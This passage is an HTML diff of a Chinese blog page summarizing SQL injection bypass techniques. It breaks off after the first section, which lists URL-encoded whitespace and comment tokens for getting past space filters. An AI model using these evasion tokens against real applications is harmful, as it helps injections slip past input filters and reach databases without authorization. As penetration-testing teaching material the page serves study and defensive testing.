@@ -1,0 +1,407 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <title>SQL注入绕过技术总结 | 冰河技术</title>
+    <meta name="generator" content="VuePress 1.9.7">
+    <link rel="icon" href="/favicon.ico">
+    <script charset="utf-8" async="async" src="/js/jquery.min.js"></script>
+    <script charset="utf-8" async="async" src="/js/global.js"></script>
+    <script charset="utf-8" async="async" src="/js/fingerprint2.min.js"></script>
+    <script charset="utf-8" async="async" src="https://v1.cnzz.com/z_stat.php?id=1281063564&amp;web_id=1281063564"></script>
+    <script charset="utf-8" async="async" src="https://s9.cnzz.com/z_stat.php?id=1281064551&amp;web_id=1281064551"></script>
+    <script>
+            var _hmt = _hmt || [];
+            (function() {
+              var hm = document.createElement("script");
+              hm.src = "https://hm.baidu.com/hm.js?d091d2fd0231588b1d0f9231e24e3f5e";
+              var s = document.getElementsByTagName("script")[0];
+              s.parentNode.insertBefore(hm, s);
+            })();
+            </script>
+    <meta name="description" content="包含：编程语言，开发技术，分布式，微服务，高并发，高可用，高可扩展，高可维护，JVM技术，MySQL，分布式数据库，分布式事务，云原生，大数据，云计算，渗透技术，各种面试题，面试技巧...">
+    <meta property="article:modified_time" content="2022-05-02T13:40:22.000Z">
+    <meta property="og:title" content="SQL注入绕过技术总结">
+    <meta property="og:type" content="article">
+    <meta property="og:url" content="/md/hack/sql/2022-05-02-005-SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93.html">
+    <meta name="twitter:title" content="SQL注入绕过技术总结">
+    <meta name="twitter:url" content="/md/hack/sql/2022-05-02-005-SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93.html">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="robots" content="all">
+    <meta name="author" content="冰河">
+    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+    <meta http-equiv="Pragma" content="no-cache">
+    <meta http-equiv="Expires" content="0">
+    <meta name="keywords" content="冰河，冰河技术, 编程语言，开发技术，分布式，微服务，高并发，高可用，高可扩展，高可维护，JVM技术，MySQL，分布式数据库，分布式事务，云原生，大数据，云计算，渗透技术，各种面试题，面试技巧">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    
+    <link rel="preload" href="/assets/css/0.styles.ab888ebb.css" as="style"><link rel="preload" href="/assets/css/styles.css?v=1651498924626" as="style"><link rel="preload" href="/assets/js/cg-styles.js?v=1651498924626" as="script"><link rel="preload" href="/assets/js/cg-app.js?v=1651498924626" as="script"><link rel="preload" href="/assets/js/cg-4.js?v=1651498924626" as="script"><link rel="preload" href="/assets/js/cg-3.js?v=1651498924626" as="script"><link rel="preload" href="/assets/js/cg-156.js?v=1651498924626" as="script"><link rel="preload" href="/assets/js/cg-5.js?v=1651498924626" as="script"><link rel="preload" href="/assets/js/cg-6.js?v=1651498924626" as="script">
+    <link rel="stylesheet" href="/assets/css/0.styles.ab888ebb.css"><link rel="stylesheet" href="/assets/css/styles.css?v=1651498924626">
+  </head>
+  <body>
+    <div id="app" data-server-rendered="true"><div class="theme-container"><header class="navbar"><div class="sidebar-button"><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" role="img" viewBox="0 0 448 512" class="icon"><path fill="currentColor" d="M436 124H12c-6.627 0-12-5.373-12-12V80c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12z"></path></svg></div> <a href="/" class="home-link router-link-active"><!----> <span class="site-name">冰河技术</span></a> <div class="links"><div class="search-box"><input aria-label="Search" autocomplete="off" spellcheck="false" value=""> <!----></div> <nav class="nav-links can-hide"><div class="nav-item"><a href="/md/other/guide-to-reading.html" class="nav-link">
+  导读
+</a></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="核心技术" class="dropdown-title"><span class="title">核心技术</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><h4>
+          Java核心技术
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/md/core/java/basics/2022-04-28-全网最全正则表达式总结.html" class="nav-link">
+  Java基础
+</a></li><li class="dropdown-subitem"><a href="/md/core/java/advanced/default.html" class="nav-link">
+  Java进阶
+</a></li><li class="dropdown-subitem"><a href="/md/core/java/senior/default.html" class="nav-link">
+  Java高级
+</a></li><li class="dropdown-subitem"><a href="/md/core/java/java8/2022-03-31-001-Java8有哪些新特性呢？.html" class="nav-link">
+  Java8新特性
+</a></li></ul></li><li class="dropdown-item"><h4>
+          Spring核心技术
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/md/core/spring/ioc/2022-04-04-001-聊聊Spring注解驱动开发那些事儿.html" class="nav-link">
+  IOC核心技术
+</a></li><li class="dropdown-subitem"><a href="/md/core/spring/aop/default.html" class="nav-link">
+  AOP核心技术
+</a></li></ul></li><li class="dropdown-item"><h4>
+          JVM核心技术
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/md/core/jvm/2022-04-18-001-JVM调优的几种场景.html" class="nav-link">
+  JVM调优技术
+</a></li></ul></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="性能调优" class="dropdown-title"><span class="title">性能调优</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/md/performance/jvm/default.html" class="nav-link">
+  JVM性能调优
+</a></li><li class="dropdown-item"><!----> <a href="/md/performance/tomcat/default.html" class="nav-link">
+  Tomcat性能调优
+</a></li><li class="dropdown-item"><!----> <a href="/md/performance/mysql/default.html" class="nav-link">
+  MySQL性能调优
+</a></li><li class="dropdown-item"><!----> <a href="/md/performance/system/default.html" class="nav-link">
+  操作系统性能调优
+</a></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="并发编程" class="dropdown-title"><span class="title">并发编程</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/md/concurrent/bottom/default.html" class="nav-link">
+  底层技术
+</a></li><li class="dropdown-item"><!----> <a href="/md/concurrent/source/2020-03-30-001-一文搞懂线程与多线程.html" class="nav-link">
+  源码分析
+</a></li><li class="dropdown-item"><!----> <a href="/md/concurrent/basics/2020-03-30-001-明明中断了线程，却为何不起作用呢？.html" class="nav-link">
+  基础案例
+</a></li><li class="dropdown-item"><!----> <a href="/md/concurrent/ActualCombat/default.html" class="nav-link">
+  实战案例
+</a></li><li class="dropdown-item"><!----> <a href="/md/concurrent/interview/default.html" class="nav-link">
+  面试
+</a></li><li class="dropdown-item"><!----> <a href="/md/concurrent/framework/default.html" class="nav-link">
+  系统架构
+</a></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="框架源码" class="dropdown-title"><span class="title">框架源码</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/md/frame/spring/default.html" class="nav-link">
+  Spring源码
+</a></li><li class="dropdown-item"><!----> <a href="/md/frame/springmvc/default.html" class="nav-link">
+  SpringMVC源码
+</a></li><li class="dropdown-item"><!----> <a href="/md/frame/mybatis/default.html" class="nav-link">
+  MyBatis源码
+</a></li><li class="dropdown-item"><!----> <a href="/md/frame/dubbo/default.html" class="nav-link">
+  Dubbo源码
+</a></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="分布式" class="dropdown-title"><span class="title">分布式</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><h4>
+          缓存技术
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/md/distributed/cache/default.html" class="nav-link">
+  Redis
+</a></li></ul></li><li class="dropdown-item"><h4>
+          服务注册发现
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/md/distributed/zookeeper/default.html" class="nav-link">
+  Zookeeper
+</a></li></ul></li><li class="dropdown-item"><h4>
+          消息中间件
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/md/distributed/mq/rabbitmq/default.html" class="nav-link">
+  RabbitMQ
+</a></li><li class="dropdown-subitem"><a href="/md/distributed/mq/rocketmq/default.html" class="nav-link">
+  RocketMQ
+</a></li><li class="dropdown-subitem"><a href="/md/distributed/mq/kafka/default.html" class="nav-link">
+  Kafka
+</a></li></ul></li><li class="dropdown-item"><h4>
+          网络通信
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/md/distributed/netty/default.html" class="nav-link">
+  Netty
+</a></li></ul></li><li class="dropdown-item"><h4>
+          远程调用
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/md/distributed/dubbo/default.html" class="nav-link">
+  Dubbo
+</a></li></ul></li><li class="dropdown-item"><h4>
+          数据库
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/md/distributed/mongodb/default.html" class="nav-link">
+  MongoDB
+</a></li></ul></li><li class="dropdown-item"><h4>
+          搜索引擎
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/md/distributed/es/default.html" class="nav-link">
+  ElasticSearch
+</a></li></ul></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="微服务" class="dropdown-title"><span class="title">微服务</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/md/microservices/springboot/default.html" class="nav-link">
+  SpringBoot
+</a></li><li class="dropdown-item"><!----> <a href="/md/microservices/springcloudalibaba/2022-04-02-SpringCloudAlibaba专栏开篇.html" class="nav-link">
+  SpringCloudAlibaba
+</a></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="中间件" class="dropdown-title"><span class="title">中间件</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/md/middleware/bytecode/2022-04-11-001-工作多年的你依然重复做着CRUD-是否接触过这种技术.html" class="nav-link">
+  字节码编程
+</a></li><li class="dropdown-item"><!----> <a href="/md/middleware/threadpool/default.html" class="nav-link">
+  手写线程池
+</a></li><li class="dropdown-item"><!----> <a href="/md/middleware/limiter/default.html" class="nav-link">
+  分布式限流
+</a></li><li class="dropdown-item"><!----> <a href="/md/middleware/independent/default.html" class="nav-link">
+  开源项目
+</a></li></ul></div></div><div class="nav-item"><a href="/md/project/default.html" class="nav-link">
+  项目实战
+</a></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="渗透技术" class="dropdown-title"><span class="title">渗透技术</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/md/hack/environment/2022-04-17-001-安装Kali系统.html" class="nav-link">
+  基础环境篇
+</a></li><li class="dropdown-item"><!----> <a href="/md/hack/tools/2022-04-17-001-使用Easy-Creds工具攻击无线网络.html" class="nav-link">
+  渗透工具篇
+</a></li><li class="dropdown-item"><!----> <a href="/md/hack/horse/2022-05-02-001-各种一句话木马大全.html" class="nav-link">
+  木马篇
+</a></li><li class="dropdown-item"><!----> <a href="/md/hack/sql/2022-05-02-001-sqli-labs-master下载与安装.html" class="nav-link">
+  SQL注入篇
+</a></li><li class="dropdown-item"><!----> <a href="/md/hack/shell/default.html" class="nav-link">
+  漏洞拿Shell篇
+</a></li><li class="dropdown-item"><!----> <a href="/md/hack/crack/default.html" class="nav-link">
+  暴力破解篇
+</a></li><li class="dropdown-item"><!----> <a href="/md/hack/bash/default.html" class="nav-link">
+  渗透脚本篇
+</a></li><li class="dropdown-item"><!----> <a href="/md/hack/raising/default.html" class="nav-link">
+  数据与系统提权篇
+</a></li><li class="dropdown-item"><!----> <a href="/md/hack/client/default.html" class="nav-link">
+  客户端渗透篇
+</a></li><li class="dropdown-item"><!----> <a href="/md/hack/sociology/default.html" class="nav-link">
+  社会工程学
+</a></li><li class="dropdown-item"><!----> <a href="/md/hack/question/default.html" class="nav-link">
+  问题记录篇
+</a></li></ul></div></div><div class="nav-item"><a href="/md/interview/2022-04-18-001-面试必问-聊聊JVM性能调优.html" class="nav-link">
+  面试必问系列
+</a></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="📚PDF" class="dropdown-title"><span class="title">📚PDF</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><h4>
+          出版图书
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/md/knowledge/book/2022-03-29-深入理解分布式事务.html" class="nav-link">
+  《深入理解分布式事务：原理与实战》
+</a></li><li class="dropdown-subitem"><a href="/md/knowledge/book/2022-03-29-MySQL技术大全.html" class="nav-link">
+  《MySQL技术大全：开发、优化与运维实战》
+</a></li><li class="dropdown-subitem"><a href="/md/knowledge/book/2022-03-29-海量数据处理与大数据技术实战.html" class="nav-link">
+  《海量数据处理与大数据技术实战》
+</a></li></ul></li><li class="dropdown-item"><h4>
+          电子书籍
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/md/knowledge/pdf/2022-03-30-《冰河的渗透实战笔记》电子书，442页，37万字，正式发布.html" class="nav-link">
+  冰河的渗透实战笔记
+</a></li></ul></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="关于" class="dropdown-title"><span class="title">关于</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/md/about/me/about-me.html" class="nav-link">
+  关于自己
+</a></li><li class="dropdown-item"><!----> <a href="/md/about/study/default.html" class="nav-link">
+  关于学习
+</a></li><li class="dropdown-item"><!----> <a href="/md/about/job/default.html" class="nav-link">
+  关于职场
+</a></li></ul></div></div><div class="nav-item"><a href="https://space.bilibili.com/517638832" target="_blank" rel="noopener noreferrer" class="nav-link external">
+  B站
+  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></div><div class="nav-item"><a href="https://github.com/binghe001/BingheGuide" target="_blank" rel="noopener noreferrer" class="nav-link external">
+  Github
+  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></div> <!----></nav></div></header> <div class="sidebar-mask"></div> <aside class="sidebar"><nav class="nav-links"><div class="nav-item"><a href="/md/other/guide-to-reading.html" class="nav-link">
+  导读
+</a></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="核心技术" class="dropdown-title"><span class="title">核心技术</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><h4>
+          Java核心技术
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/md/core/java/basics/2022-04-28-全网最全正则表达式总结.html" class="nav-link">
+  Java基础
+</a></li><li class="dropdown-subitem"><a href="/md/core/java/advanced/default.html" class="nav-link">
+  Java进阶
+</a></li><li class="dropdown-subitem"><a href="/md/core/java/senior/default.html" class="nav-link">
+  Java高级
+</a></li><li class="dropdown-subitem"><a href="/md/core/java/java8/2022-03-31-001-Java8有哪些新特性呢？.html" class="nav-link">
+  Java8新特性
+</a></li></ul></li><li class="dropdown-item"><h4>
+          Spring核心技术
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/md/core/spring/ioc/2022-04-04-001-聊聊Spring注解驱动开发那些事儿.html" class="nav-link">
+  IOC核心技术
+</a></li><li class="dropdown-subitem"><a href="/md/core/spring/aop/default.html" class="nav-link">
+  AOP核心技术
+</a></li></ul></li><li class="dropdown-item"><h4>
+          JVM核心技术
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/md/core/jvm/2022-04-18-001-JVM调优的几种场景.html" class="nav-link">
+  JVM调优技术
+</a></li></ul></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="性能调优" class="dropdown-title"><span class="title">性能调优</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/md/performance/jvm/default.html" class="nav-link">
+  JVM性能调优
+</a></li><li class="dropdown-item"><!----> <a href="/md/performance/tomcat/default.html" class="nav-link">
+  Tomcat性能调优
+</a></li><li class="dropdown-item"><!----> <a href="/md/performance/mysql/default.html" class="nav-link">
+  MySQL性能调优
+</a></li><li class="dropdown-item"><!----> <a href="/md/performance/system/default.html" class="nav-link">
+  操作系统性能调优
+</a></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="并发编程" class="dropdown-title"><span class="title">并发编程</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/md/concurrent/bottom/default.html" class="nav-link">
+  底层技术
+</a></li><li class="dropdown-item"><!----> <a href="/md/concurrent/source/2020-03-30-001-一文搞懂线程与多线程.html" class="nav-link">
+  源码分析
+</a></li><li class="dropdown-item"><!----> <a href="/md/concurrent/basics/2020-03-30-001-明明中断了线程，却为何不起作用呢？.html" class="nav-link">
+  基础案例
+</a></li><li class="dropdown-item"><!----> <a href="/md/concurrent/ActualCombat/default.html" class="nav-link">
+  实战案例
+</a></li><li class="dropdown-item"><!----> <a href="/md/concurrent/interview/default.html" class="nav-link">
+  面试
+</a></li><li class="dropdown-item"><!----> <a href="/md/concurrent/framework/default.html" class="nav-link">
+  系统架构
+</a></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="框架源码" class="dropdown-title"><span class="title">框架源码</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/md/frame/spring/default.html" class="nav-link">
+  Spring源码
+</a></li><li class="dropdown-item"><!----> <a href="/md/frame/springmvc/default.html" class="nav-link">
+  SpringMVC源码
+</a></li><li class="dropdown-item"><!----> <a href="/md/frame/mybatis/default.html" class="nav-link">
+  MyBatis源码
+</a></li><li class="dropdown-item"><!----> <a href="/md/frame/dubbo/default.html" class="nav-link">
+  Dubbo源码
+</a></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="分布式" class="dropdown-title"><span class="title">分布式</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><h4>
+          缓存技术
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/md/distributed/cache/default.html" class="nav-link">
+  Redis
+</a></li></ul></li><li class="dropdown-item"><h4>
+          服务注册发现
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/md/distributed/zookeeper/default.html" class="nav-link">
+  Zookeeper
+</a></li></ul></li><li class="dropdown-item"><h4>
+          消息中间件
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/md/distributed/mq/rabbitmq/default.html" class="nav-link">
+  RabbitMQ
+</a></li><li class="dropdown-subitem"><a href="/md/distributed/mq/rocketmq/default.html" class="nav-link">
+  RocketMQ
+</a></li><li class="dropdown-subitem"><a href="/md/distributed/mq/kafka/default.html" class="nav-link">
+  Kafka
+</a></li></ul></li><li class="dropdown-item"><h4>
+          网络通信
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/md/distributed/netty/default.html" class="nav-link">
+  Netty
+</a></li></ul></li><li class="dropdown-item"><h4>
+          远程调用
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/md/distributed/dubbo/default.html" class="nav-link">
+  Dubbo
+</a></li></ul></li><li class="dropdown-item"><h4>
+          数据库
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/md/distributed/mongodb/default.html" class="nav-link">
+  MongoDB
+</a></li></ul></li><li class="dropdown-item"><h4>
+          搜索引擎
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/md/distributed/es/default.html" class="nav-link">
+  ElasticSearch
+</a></li></ul></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="微服务" class="dropdown-title"><span class="title">微服务</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/md/microservices/springboot/default.html" class="nav-link">
+  SpringBoot
+</a></li><li class="dropdown-item"><!----> <a href="/md/microservices/springcloudalibaba/2022-04-02-SpringCloudAlibaba专栏开篇.html" class="nav-link">
+  SpringCloudAlibaba
+</a></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="中间件" class="dropdown-title"><span class="title">中间件</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/md/middleware/bytecode/2022-04-11-001-工作多年的你依然重复做着CRUD-是否接触过这种技术.html" class="nav-link">
+  字节码编程
+</a></li><li class="dropdown-item"><!----> <a href="/md/middleware/threadpool/default.html" class="nav-link">
+  手写线程池
+</a></li><li class="dropdown-item"><!----> <a href="/md/middleware/limiter/default.html" class="nav-link">
+  分布式限流
+</a></li><li class="dropdown-item"><!----> <a href="/md/middleware/independent/default.html" class="nav-link">
+  开源项目
+</a></li></ul></div></div><div class="nav-item"><a href="/md/project/default.html" class="nav-link">
+  项目实战
+</a></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="渗透技术" class="dropdown-title"><span class="title">渗透技术</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/md/hack/environment/2022-04-17-001-安装Kali系统.html" class="nav-link">
+  基础环境篇
+</a></li><li class="dropdown-item"><!----> <a href="/md/hack/tools/2022-04-17-001-使用Easy-Creds工具攻击无线网络.html" class="nav-link">
+  渗透工具篇
+</a></li><li class="dropdown-item"><!----> <a href="/md/hack/horse/2022-05-02-001-各种一句话木马大全.html" class="nav-link">
+  木马篇
+</a></li><li class="dropdown-item"><!----> <a href="/md/hack/sql/2022-05-02-001-sqli-labs-master下载与安装.html" class="nav-link">
+  SQL注入篇
+</a></li><li class="dropdown-item"><!----> <a href="/md/hack/shell/default.html" class="nav-link">
+  漏洞拿Shell篇
+</a></li><li class="dropdown-item"><!----> <a href="/md/hack/crack/default.html" class="nav-link">
+  暴力破解篇
+</a></li><li class="dropdown-item"><!----> <a href="/md/hack/bash/default.html" class="nav-link">
+  渗透脚本篇
+</a></li><li class="dropdown-item"><!----> <a href="/md/hack/raising/default.html" class="nav-link">
+  数据与系统提权篇
+</a></li><li class="dropdown-item"><!----> <a href="/md/hack/client/default.html" class="nav-link">
+  客户端渗透篇
+</a></li><li class="dropdown-item"><!----> <a href="/md/hack/sociology/default.html" class="nav-link">
+  社会工程学
+</a></li><li class="dropdown-item"><!----> <a href="/md/hack/question/default.html" class="nav-link">
+  问题记录篇
+</a></li></ul></div></div><div class="nav-item"><a href="/md/interview/2022-04-18-001-面试必问-聊聊JVM性能调优.html" class="nav-link">
+  面试必问系列
+</a></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="📚PDF" class="dropdown-title"><span class="title">📚PDF</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><h4>
+          出版图书
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/md/knowledge/book/2022-03-29-深入理解分布式事务.html" class="nav-link">
+  《深入理解分布式事务：原理与实战》
+</a></li><li class="dropdown-subitem"><a href="/md/knowledge/book/2022-03-29-MySQL技术大全.html" class="nav-link">
+  《MySQL技术大全：开发、优化与运维实战》
+</a></li><li class="dropdown-subitem"><a href="/md/knowledge/book/2022-03-29-海量数据处理与大数据技术实战.html" class="nav-link">
+  《海量数据处理与大数据技术实战》
+</a></li></ul></li><li class="dropdown-item"><h4>
+          电子书籍
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/md/knowledge/pdf/2022-03-30-《冰河的渗透实战笔记》电子书，442页，37万字，正式发布.html" class="nav-link">
+  冰河的渗透实战笔记
+</a></li></ul></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="关于" class="dropdown-title"><span class="title">关于</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/md/about/me/about-me.html" class="nav-link">
+  关于自己
+</a></li><li class="dropdown-item"><!----> <a href="/md/about/study/default.html" class="nav-link">
+  关于学习
+</a></li><li class="dropdown-item"><!----> <a href="/md/about/job/default.html" class="nav-link">
+  关于职场
+</a></li></ul></div></div><div class="nav-item"><a href="https://space.bilibili.com/517638832" target="_blank" rel="noopener noreferrer" class="nav-link external">
+  B站
+  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></div><div class="nav-item"><a href="https://github.com/binghe001/BingheGuide" target="_blank" rel="noopener noreferrer" class="nav-link external">
+  Github
+  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></div> <!----></nav>  <ul class="sidebar-links"><li><section class="sidebar-group depth-0"><p class="sidebar-heading open"><span>SQL注入篇</span> <!----></p> <ul class="sidebar-links sidebar-group-items"><li><a href="/md/hack/sql/2022-05-02-001-sqli-labs-master下载与安装.html" class="sidebar-link">sqli-labs-master 下载与安装</a></li><li><a href="/md/hack/sql/2022-05-02-002-SQL注入点检测方法.html" class="sidebar-link">SQL注入点检测方法</a></li><li><a href="/md/hack/sql/2022-05-02-003-SQL语句生成一句话.html" class="sidebar-link">SQL语句生成一句话</a></li><li><a href="/md/hack/sql/2022-05-02-004-ASP连接MSSQL数据库语句.html" class="sidebar-link">ASP连接MSSQL数据库语句</a></li><li><a href="/md/hack/sql/2022-05-02-005-SQL注入绕过技术总结.html" class="active sidebar-link">SQL注入绕过技术总结</a></li><li><a href="/md/hack/sql/2022-05-02-006-SQLServer启动-关闭xp_cmdshell.html" class="sidebar-link">SQL Server启动/关闭xp_cmdshell</a></li></ul></section></li></ul> </aside> <div><main class="page"> <div class="theme-default-content content__default"><h1 id="sql注入绕过技术总结"><a href="#sql注入绕过技术总结" class="header-anchor">#</a> SQL注入绕过技术总结</h1> <p>转载请注明出处：https://blog.csdn.net/l1028386804/article/details/85869703</p> <h2 id="绕过空格-注释符-a0"><a href="#绕过空格-注释符-a0" class="header-anchor">#</a> 绕过空格（注释符/* */，%a0）</h2> <p>两个空格代替一个空格，用Tab代替空格，%a0=空格：</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code><span class="token operator">%</span><span class="token number">20</span> <span class="token operator">%</span><span class="token number">09</span> <span class="token operator">%</span><span class="token number">0</span>a <span class="token operator">%</span><span class="token number">0</span>b <span class="token operator">%</span><span class="token number">0</span>c <span class="token operator">%</span><span class="token number">0</span>d <span class="token operator">%</span>a0 <span class="token operator">%</span><span class="token number">00</span> <span class="token comment">/**/</span>  <span class="token comment">/*!*/</span>
